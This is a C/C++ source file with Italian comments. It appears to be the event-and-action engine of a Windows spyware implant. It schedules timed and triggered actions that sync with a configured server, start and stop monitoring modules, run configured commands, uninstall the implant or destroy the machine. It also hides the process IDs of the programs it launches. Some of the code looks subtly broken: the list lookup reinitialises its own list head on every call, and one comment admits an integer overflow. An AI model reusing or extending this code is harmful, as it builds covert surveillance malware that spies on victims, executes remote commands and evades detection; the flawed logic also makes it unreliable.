#include <mutex>
#include <windows.h>
#include <rcs/list.h>
#include <cJSON/cJSON.h>
#include "common.h"
#include "bss.h"
#include "H4-DLL.h"
#include "demo_functions.h"
#include "UnHookClass.h"
#include "DeepFreeze.h"
#include "x64.h"
#include "SM_Core.h"
#include "SM_ActionFunctions.h"
#include "process.h"
#include "SM_EventHandlers.h"

// Il sistema si basa su condizioni->eventi->azioni
// Un event monitor, quando si verifica una condizione, genera un evento. Le condizioni sono verificate a discrezione
// dell'event monitor (EM)stesso in base al Param passato alla funzione pEventMonitorAdd. 
// Quando una condizione si verifica, l'EM richiama TriggerEvent. Il SyncManager monitora gli eventi e, quando ne
// rileva uno, esegue le azioni associate nella sua tabella eventi/azioni.


#define MAX_EVENT_MONITOR 15 // Massimo numero di event monitor registrabili
#define MAX_DISPATCH_FUNCTION 15 // Massimo numero di azioni registrabili
#define SYNCM_SLEEPTIME 100

typedef void (WINAPI *EventMonitorAdd_t) (cJSON*, EVENT_PARAM *, DWORD);
typedef void (WINAPI *EventMonitorStart_t) (void);
typedef void (WINAPI *EventMonitorStop_t) (void);
typedef BOOL (WINAPI *ActionFunc_t) (BYTE *);

ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action);

typedef void (WINAPI *conf_callback_t)(cJSON *, DWORD counter);
extern BOOL HM_ParseConfSection(char *conf, const char *section, conf_callback_t call_back);
extern BOOL HM_CountConfSection(char *conf, const char *section, DWORD *count);
extern DWORD AM_GetAgentTag(const CHAR *agent_name);

// Gestione event monitor  ----------------------------------------------

typedef struct  {
	CHAR event_type[32];
	EventMonitorAdd_t pEventMonitorAdd;
	EventMonitorStart_t pEventMonitorStart;
	EventMonitorStop_t pEventMonitorStop;
} EVENT_MONITOR;

// Struttura per gestire i thread di ripetizione
typedef struct {
	DWORD event_id;
	DWORD repeat_action;
	DWORD count; 
	DWORD delay;
	BOOL  semaphore;
} REPEATED_EVENT;

// Struttura della tabella degli eventi
typedef struct {
	BOOL event_enabled;
	REPEATED_EVENT repeated_event;
	HANDLE repeated_thread;
} EVENT_TABLE;

// Tabella degli event monitor attualmente registrati
DWORD event_monitor_count = 0;
EVENT_MONITOR event_monitor_array[MAX_EVENT_MONITOR];

// Tabella contenente lo stato di attivazione di tutti gli eventi nel file di configurazione
EVENT_TABLE *event_table = NULL;
DWORD event_count = 0;

DWORD WINAPI RepeatThread(REPEATED_EVENT *repeated_event)
{
	DWORD i = 0;
	LOOP {
		CANCELLATION_SLEEP(repeated_event->semaphore, repeated_event->delay);
		if (i < repeated_event->count) {
			i++;
			TriggerEvent(repeated_event->repeat_action, repeated_event->event_id);
		}
	}
	return 0;
}

// Permette di gestire i repeat degli eventi
void CreateRepeatThread(DWORD event_id, DWORD repeat_action, DWORD count, DWORD delay)
{
	DWORD dummy;

	// Non c'e' nessuna azione da fare
	if (repeat_action == AF_NONE || count == 0 || delay<1000)
		return;
	// L'evento non e' riconosciuto
	if (event_id >= event_count)
		return;
	// C'e' gia' un thread attivo per quell'evento
	if (event_table[event_id].repeated_thread)
		return;

	event_table[event_id].repeated_event.count = count;
	event_table[event_id].repeated_event.delay = delay;
	event_table[event_id].repeated_event.event_id = event_id;
	event_table[event_id].repeated_event.repeat_action = repeat_action;
	event_table[event_id].repeated_event.semaphore = FALSE;

	event_table[event_id].repeated_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RepeatThread, &event_table[event_id].repeated_event, 0, &dummy);
}

void StopRepeatThread(DWORD event_id)
{
	// L'evento non e' riconosciuto
	if (event_id >= event_count)
		return;

	QUERY_CANCELLATION(event_table[event_id].repeated_thread, event_table[event_id].repeated_event.semaphore);
}

// Registra un nuovo event monitor
void EventMonitorRegister(CHAR *event_type, EventMonitorAdd_t pEventMonitorAdd, 
						  EventMonitorStart_t pEventMonitorStart,
						  EventMonitorStop_t pEventMonitorStop)
{
	if (event_monitor_count >= MAX_EVENT_MONITOR)
		return;

	sprintf_s(event_monitor_array[event_monitor_count].event_type, "%s", event_type);
	event_monitor_array[event_monitor_count].pEventMonitorAdd = pEventMonitorAdd;
	event_monitor_array[event_monitor_count].pEventMonitorStop = pEventMonitorStop;
	event_monitor_array[event_monitor_count].pEventMonitorStart = pEventMonitorStart;

	event_monitor_count++;
}

void EventMonitorStartAll()
{
	DWORD i;
	for (i=0; i<event_monitor_count; i++)
		if (event_monitor_array[i].pEventMonitorStart)
			event_monitor_array[i].pEventMonitorStart();
}

void EventMonitorStopAll()
{
	DWORD i;
	for (i=0; i<event_monitor_count; i++)
		if (event_monitor_array[i].pEventMonitorStop)
			event_monitor_array[i].pEventMonitorStop();
}

void EventTableInit()
{
	SAFE_FREE(event_table);
	event_count = 0;
}

// Setta lo stato iniziale di un evento
void SM_EventTableState(DWORD event_id, BOOL state)
{
	EVENT_TABLE *temp_event_table;
	// Alloca la tabella per contenere quel dato evento 
	// La tabella e' posizionale
	if (event_id >= event_count) {
		temp_event_table = (EVENT_TABLE *)realloc(event_table, (event_id + 1) * sizeof(EVENT_TABLE));
		if (!temp_event_table)
			return;
		event_table = temp_event_table;
		event_count = event_id + 1;
		event_table[event_id].repeated_thread = NULL;
		ZeroMemory(&event_table[event_id].repeated_event, sizeof(REPEATED_EVENT));
	}
	event_table[event_id].event_enabled = state;
}

// Assegna una riga "evento" della configurazione al corretto event monitor
void EventMonitorAddLine(const CHAR *event_type, cJSON* conf_json, EVENT_PARAM *event_param, DWORD event_id, BOOL event_state)
{
	DWORD i;
	// Inizializza lo stato attivo/disattivo dell'evento
	SM_EventTableState(event_id, event_state);

	for (i=0; i<event_monitor_count; i++)
		if (!stricmp(event_monitor_array[i].event_type, event_type)) {
			event_monitor_array[i].pEventMonitorAdd(conf_json, event_param, event_id);
			break;
		}
}

BOOL EventIsEnabled(DWORD event_id)
{
	// L'evento non e' mai stato visto e inizializzato
	if (event_id >= event_count)
		return FALSE;

	return event_table[event_id].event_enabled;
}
//------------------------------------------------------------------

// Tabella delle actions ------------------------------------------

typedef struct {
	ActionFunc_t pActionFunc; // Puntatore alla funzione che effettua l'action
	BYTE *param;              // Puntatore all'array contenente i parametri
} ACTION_ELEM;

typedef struct {
	LIST_ENTRY entry;

	DWORD subaction_count; // numero di azioni collegate all'evento 
	ACTION_ELEM *subaction_list; // puntatore all'array delle azioni 
	BOOL is_fast_action; // e' TRUE se non contiene alcuna sottoazione lenta (sync, uninst e execute)
	BOOL triggered; // Se l'evento e' triggerato o meno
} EVENT_ACTION_ELEM;

static LIST_ENTRY event_action_array = {}; // Puntatore all'array dinamico contenente le actions.
                                                     // Si chiude con una entry nulla.
static DWORD event_action_count = 0; // Numero di elementi nella tabella event/actions

static EVENT_ACTION_ELEM* AllocateEventAction()
{
	void* ptr = malloc(sizeof(EVENT_ACTION_ELEM));
	if (ptr != NULL) {
		memset(ptr, 0, sizeof(EVENT_ACTION_ELEM));
	}

	return (EVENT_ACTION_ELEM*)ptr;
}

static EVENT_ACTION_ELEM* GetEventPosition(DWORD size)
{
	InitializeListHead(&event_action_array);

	if (IsListEmpty(&event_action_array))
		return NULL;

	LIST_ENTRY* head = &event_action_array;

	for (; size > 0; size--) {
		if (head->Flink == &event_action_array)
			return NULL;

		head = head->Flink;
	}

	return (EVENT_ACTION_ELEM *)head->Flink;
}

// Funzione da esportare (per eventuali event monitor esterni o per far generare eventi anche 
// agli agents). Triggera l'evento "index". L'event_id indica quale evento sta triggerando l'azione.
// Se l'evento e' stato disabilitato, l'azione non e' triggerata
void TriggerEvent(DWORD index, DWORD event_id)
{
	EVENT_ACTION_ELEM* entry = GetEventPosition(index);
	if (entry != NULL) {
		if (EventIsEnabled(event_id))
			entry->triggered = TRUE;
	}
}

static BOOL ReadEvent(DWORD* base, DWORD* event_id, BOOL action_type)
{
	EVENT_ACTION_ELEM* entry = NULL;
	do {
		entry = GetEventPosition(*base);

		if (entry != NULL) {
			if (entry->triggered && entry->is_fast_action == action_type) {
				entry->triggered = FALSE;
				*event_id = *base;
				*base = *base + 1;
				return TRUE;
			}
		}

		*base = *base + 1;
	} while (entry != NULL);

	*base = 0;
	return FALSE;
}

// Cerca un evento qualsiasi che e' stato triggerato. Se lo trova torna TRUE e valorizza
// il puntatore all'array delle relative actions e il numero delle actions stesse.
// Legge solo le azioni lente
BOOL ReadEventSlow(DWORD *event_id)
{
	static DWORD i = 0;

	return ReadEvent(&i, event_id, FALSE);
}

// Legge solo azioni veloci
BOOL ReadEventFast(DWORD *event_id)
{
	static DWORD i = 0;
	return ReadEvent(&i, event_id, TRUE);
}

// Esegue le actions indicate
void DispatchEvent(DWORD event_id)
{
	DWORD i;

	// Se l'evento non esiste nella event_action table ritorna
	EVENT_ACTION_ELEM* entry = GetEventPosition(event_id);

	if (entry == NULL)
		return;

	// Se l'action torna TRUE (es: nuova configurazione), smette di eseguire
	// sottoazioni che potrebbero non esistere piu'
	for (i=0; i<entry->subaction_count; i++) {
		if (entry->subaction_list[i].pActionFunc) {
			if (entry->subaction_list[i].pActionFunc(entry->subaction_list[i].param))
				break;
		}
	}
}


// Aggiunge una sotto-azione per l'azione "event_number" 
// Torna FALSE solo se ha inserito con successo una azione slow
BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *param)
{
	BOOL is_fast_action;
	DWORD subaction_count;

	// Se l'evento non esiste nella event_action table ritorna
	EVENT_ACTION_ELEM* entry = GetEventPosition(event_number);

	if (entry == NULL)
		return TRUE;

	// All'inizio subaction_list e subaction_count sono a 0 perche' azzerate nella ActionTableInit
	// XXX si, c'e' un int overflow se ci sono 2^32 sotto azioni che potrebbe portare a un exploit nello heap (es: double free)....
	void *dst = realloc(entry->subaction_list, sizeof(ACTION_ELEM) * (entry->subaction_count + 1) );

	// Se non riesce ad aggiungere la nuova sottoazione lascia tutto com'e'
	if (!dst)
		return TRUE;

	// Se l'array delle sottoazioni e' stato ampliato con successo, incrementa il numero delle sottoazioni
	// e aggiunge la nuova subaction
	subaction_count = entry->subaction_count++;
	entry->subaction_list = (ACTION_ELEM *)dst;
	entry->subaction_list[subaction_count].pActionFunc = ActionFuncGet(subaction_type, &is_fast_action);

	entry->subaction_list[subaction_count].param = param;

	return is_fast_action;
}


static void DeleteListAction()
{
	while (IsListEmpty(&event_action_array) == FALSE) {
		EVENT_ACTION_ELEM *entry = GetEventPosition(0);
		if (entry != NULL) {
			for (DWORD j = 0; j < entry->subaction_count; j++)
				SAFE_FREE(entry->subaction_list[j].param);

			SAFE_FREE(entry->subaction_list);
			RemoveEntryList(&entry->entry);
			free(entry);	// deallocate memory!
		}
	}
}

// Quando questa funzione viene chiamata non ci devono essere thread attivi 
// che possono chiamare la funizone TriggerEvent. Dovrei proteggerlo come CriticalSection
// ma mi sembra sprecato in questo contesto (basta solo fare un po' di attenzione se si dovesse
// verificare il caso).
void ActionTableInit(DWORD number)
{
	DWORD i,j;
	EVENT_ACTION_ELEM *temp_event_action_array = NULL;
		
	DeleteListAction();

	event_action_count = 0;

	for (DWORD n = 0; n < number; n++) {
		EVENT_ACTION_ELEM *entry = AllocateEventAction();
		if (entry != NULL) {
			entry->is_fast_action = TRUE;
			InsertTailList(&event_action_array, &entry->entry);
			event_action_count++;
		}
	}
}

//----------------------------------------------------------------

// Gestione delle action function registrate -----------------------------------------------------------
typedef struct {
	DWORD action_type;
	ActionFunc_t pActionFunc;
	BOOL is_fast_action;
} DISPATCH_FUNC;


// Tabella delle azioni di default
DWORD dispatch_func_count = 0;
DISPATCH_FUNC dispatch_func_array[MAX_DISPATCH_FUNCTION];


// Registra un'action
void ActionFuncRegister(DWORD action_type, ActionFunc_t pActionFunc, BOOL is_fast_action)
{
	if (dispatch_func_count >= MAX_DISPATCH_FUNCTION)
		return;

	dispatch_func_array[dispatch_func_count].action_type = action_type;
	dispatch_func_array[dispatch_func_count].pActionFunc = pActionFunc;
	dispatch_func_array[dispatch_func_count].is_fast_action = is_fast_action;

	dispatch_func_count++;
}


// Ritorna il puntatore alla funzione di action associata ad un certo action_type
ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action)
{
	DWORD i;

	if (is_fast_action)
		*is_fast_action = TRUE;
	for (i=0; i<dispatch_func_count; i++)
		if (dispatch_func_array[i].action_type == action_type) {
			if (is_fast_action)
				*is_fast_action = dispatch_func_array[i].is_fast_action;
			return dispatch_func_array[i].pActionFunc;
		}

	return NULL;
}

//-----------------------------------------------------------------------------------
void WINAPI ParseEvents(cJSON *conf_json, DWORD counter)
{
	EVENT_PARAM event_param;

	if (cJSON_GetObjectItem(conf_json, "start"))
		event_param.start_action = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "start"));
	else
		event_param.start_action = AF_NONE;

	if (cJSON_GetObjectItem(conf_json, "end"))
		event_param.stop_action = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "end"));
	else
		event_param.stop_action = AF_NONE;

	if (cJSON_GetObjectItem(conf_json, "repeat"))
		event_param.repeat_action = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "repeat"));
	else
		event_param.repeat_action = AF_NONE;

	if (cJSON_GetObjectItem(conf_json, "iter"))
		event_param.count = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "iter"));
	else
		event_param.count = 0xFFFFFFFF;

	if (cJSON_GetObjectItem(conf_json, "delay")) {
		event_param.delay = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "delay")) * 1000;
		if (event_param.delay == 0)
			event_param.delay = 1;
	} else
		event_param.delay = 1;

	EventMonitorAddLine(
		cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "event")), 
		conf_json, &event_param, counter, cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "enabled")));
}

static wchar_t* wstrFromCfg(cJSON* root, const char* key)
{
	if (cJSON_GetObjectItem(root, key) == NULL)
		return NULL;

	cJSON* node = cJSON_GetObjectItem(root, key);

	size_t len = strlen(cJSON_GetStringValue(node));
	if (len > 0)
		len++;

	if (!len)
		return NULL;

	wchar_t* dst = (wchar_t*)malloc(len * 2);
	if (!dst)
		return NULL;

	swprintf_s(dst, len, L"%S", cJSON_GetStringValue(node));

	return dst;
}
BYTE *ParseActionParameter(cJSON* conf_json, DWORD *tag)
{
	char action[64];
	BYTE *param = NULL;
	
	if (tag)
		*tag = AF_NONE;

	_snprintf(action, 64, "%s", cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "action")));		

	if (!strcmp(action, "log")) {
		*tag = AF_LOGINFO;
		param = (BYTE *)wstrFromCfg(conf_json, "text");

	} else if (!strcmp(action, "synchronize")) {
		typedef struct {
			DWORD min_sleep;
			DWORD max_sleep;
			DWORD band_limit;
			BOOL  exit_after_completion;
			char asp_server[1];
		} sync_conf_struct;
		sync_conf_struct *sync_conf;
		*tag = AF_SYNCRONIZE;
		param = (BYTE *)malloc(sizeof(sync_conf_struct) + strlen(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "host"))));
		if (param) {
			sync_conf = (sync_conf_struct *)param;
			sync_conf->min_sleep = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "mindelay"));
			sync_conf->max_sleep = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "maxdelay"));
			sync_conf->band_limit= cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "bandwidth"));
			sync_conf->exit_after_completion = cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "stop"));
			sprintf(sync_conf->asp_server, "%s", cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "host")));
		}

	} else if (!strcmp(action, "execute")) {
		*tag = AF_EXECUTE;
		DWORD len = strlen(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "command")));
		param = (BYTE *)malloc(len+1);
		sprintf((char *)param, "%s", cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "command")));
	} else if (!strcmp(action, "uninstall")) {
		*tag = AF_UNINSTALL;

	} else if (!strcmp(action, "module")) {
		if (!strcmp(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "status")), "start"))
			*tag = AF_STARTAGENT;
		else
			*tag = AF_STOPAGENT;
		param = (BYTE *)malloc(sizeof(DWORD));
		if (param) {
			DWORD agent_tag = AM_GetAgentTag(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "module")));
			memcpy(param, &agent_tag, sizeof(DWORD));
		}

	} else if (!strcmp(action, "event")) {
		if (!strcmp(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "status")), "enable"))
			*tag = AF_STARTEVENT;
		else
			*tag = AF_STOPEVENT;
		param = (BYTE *)malloc(sizeof(DWORD));
		if (param) {
			DWORD event_id = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "event"));
			memcpy(param, &event_id, sizeof(DWORD));
		}
	} else if (!strcmp(action, "destroy")) {
		*tag = AF_DESTROY;
		param = (BYTE *)malloc(sizeof(BOOL));
		if (param) {
			BOOL isPermanent = cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "permanent"));
			memcpy(param, &isPermanent, sizeof(BOOL));
		}
	}
	return param;
}

void WINAPI ParseActions(cJSON* conf_json, DWORD counter)
{
	cJSON* subaction_array = cJSON_GetObjectItem(conf_json, "subactions");
	DWORD i;
	DWORD tag;
	BYTE *conf_ptr;

	if (cJSON_IsArray(subaction_array)) {
		cJSON* subaction = NULL;
		i = 0;

		cJSON_ArrayForEach(subaction, subaction_array) {
			if (cJSON_IsObject(subaction) == false)
				continue;

			conf_ptr = ParseActionParameter(subaction, &tag);
			// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
			// Basta una subaction slow per marcare tutto l'action
			if (ActionTableAddSubAction(counter, tag, conf_ptr)) {
				EVENT_ACTION_ELEM* entry = GetEventPosition(counter);
				if (entry != NULL)
					entry->is_fast_action = FALSE;
			}
		}
	}
}

// Istruisce gli EM per il monitor degli eventi e popola l'action table sulla base 
// del file di configurazione
void UpdateEventConf()
{
	DWORD action_count;
	char *conf_memory;
	if (!(conf_memory = HM_ReadClearConf(shared.H4_CONF_FILE)))
		return;

	// Legge gli eventi
	EventTableInit();
	HM_ParseConfSection(conf_memory, "events", &ParseEvents);

	// Legge le azioni
	HM_CountConfSection(conf_memory, "actions", &action_count);
	ActionTableInit(action_count);
	HM_ParseConfSection(conf_memory, "actions", &ParseActions);

	SAFE_FREE(conf_memory);
}


// Lista dei processi eseguiti
DWORD *process_executed = NULL;
#define MAX_PROCESS_EXECUTED 512
// Gestisce la lista dei processi eseguiti. Quando un processo
// non esiste piu' elimina l'hiding per il PID corrispondente.
void SM_HandleExecutedProcess()
{
	DWORD i;
	char *proc_name;
	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;

	// Questa funzione viene richiamata prima che possa essere 
	// eseguita SM_AddExecutedProcess: quindi e' questa che si 
	// preoccupa di inizializzare l'array dei PID
	if (!process_executed) {
		process_executed = (DWORD *)calloc(MAX_PROCESS_EXECUTED, sizeof(DWORD));
		return;
	}

	// Cicla la lista dei processi eseguiti
	for (i=0; i<MAX_PROCESS_EXECUTED; i++)
		if (process_executed[i]) {
			proc_name = HM_FindProc(process_executed[i]);
			// Se ora il PID non esiste piu' elimina l'hide
			// e lo toglie dalla lista.
			if (!proc_name) {
				SET_PID_HIDE_STRUCT(pid_hide, process_executed[i]);
				AM_RemoveHide(HIDE_PID, &pid_hide);
				process_executed[i] = 0;
			}
			SAFE_FREE(proc_name);
		}
}


// Aggiunge un processo alla lista di quelli eseguiti come azione
// Ne effettua anche l'hiding
void SM_AddExecutedProcess(DWORD pid)
{
	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;

	// Aggiorna la lista dei PID eseguiti (se e' allocata)
	if (!process_executed)
		return;

	// Nasconde il PID passato
	SET_PID_HIDE_STRUCT(pid_hide, pid);
	AM_AddHide(HIDE_PID, &pid_hide);

	// Cerca un posto libero e inserisce il PID
	for (DWORD i=0; i<MAX_PROCESS_EXECUTED; i++)
		if (!process_executed[i]) {
			process_executed[i] = pid;
			break;
		}
}

// Loop di gestione delle azioni FAST
DWORD WINAPI FastActionsThread(DWORD dummy)
{
	DWORD event_id;
	LOOP {
		CANCELLATION_POINT(bInstantActionThreadSemaphore);
		if (ReadEventFast(&event_id)) 
			DispatchEvent(event_id);
		else
			Sleep(SYNCM_SLEEPTIME);

	}
	return 0;
}


// Ciclo principale di monitoring degli eventi. E' praticamente il ciclo principale di tutto il client core.
void SM_MonitorEvents(DWORD dummy)
{
	DWORD event_id;
	DWORD dummy2;

	// Registrazione degli EM e delle AF. 
	EventMonitorRegister("timer", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
	EventMonitorRegister("afterinst", EM_TimerAdd, NULL, NULL);
	EventMonitorRegister("date", EM_TimerAdd, NULL, NULL);
	EventMonitorRegister("process", EM_MonProcAdd, EM_MonProcStart, EM_MonProcStop);
	EventMonitorRegister("connection", EM_MonConnAdd, EM_MonConnStart, EM_MonConnStop);
	EventMonitorRegister("screensaver", EM_ScreenSaverAdd, EM_ScreenSaverStart, EM_ScreenSaverStop);	
	EventMonitorRegister("winevent", EM_MonEventAdd, EM_MonEventStart, EM_MonEventStop);	
	EventMonitorRegister("quota", EM_QuotaAdd, EM_QuotaStart, EM_QuotaStop);	
	EventMonitorRegister("window", EM_NewWindowAdd, EM_NewWindowStart, EM_NewWindowStop);
	EventMonitorRegister("idle", EM_UserIdlesAdd, EM_UserIdlesStart, EM_UserIdlesStop);

	ActionFuncRegister(AF_SYNCRONIZE, DA_Syncronize, FALSE);
	ActionFuncRegister(AF_STARTAGENT, DA_StartAgent, TRUE);
	ActionFuncRegister(AF_STOPAGENT, DA_StopAgent, TRUE);
	ActionFuncRegister(AF_EXECUTE, DA_Execute, FALSE);
	ActionFuncRegister(AF_UNINSTALL, DA_Uninstall, FALSE);
	ActionFuncRegister(AF_LOGINFO, DA_LogInfo, TRUE);
	ActionFuncRegister(AF_STARTEVENT, DA_StartEvent, TRUE);
	ActionFuncRegister(AF_STOPEVENT, DA_StopEvent, TRUE);
	ActionFuncRegister(AF_DESTROY, DA_Destroy, TRUE);

	// Legge gli eventi e le azioni dal file di configurazione. 
	// Deve essere sempre posizionato DOPO la registrazione di EM e AF
	UpdateEventConf();
	EventMonitorStartAll();

	// Lancia il thread che gestira' gli eventi FAST
	hInstantActionThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FastActionsThread, NULL, 0, &dummy2);

	// Ciclo principale di lettura degli eventi
	LOOP {
		// Watchdog per la chiave nel registry (una volta ogni 10 cicli)
		/*EVERY_N_CYCLES(10)
			RegistryWatchdog();*/

		// Gestisce la lista dei processi eseguiti
		// (va eseguita per prima nel loop).
		SM_HandleExecutedProcess();

		if (ReadEventSlow(&event_id)) 
			DispatchEvent(event_id);
		else
			Sleep(SYNCM_SLEEPTIME);
	}
}

void SM_StartMonitorEvents(void)
{
	DWORD dummy;
	HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SM_MonitorEvents, NULL, 0, &dummy);
}
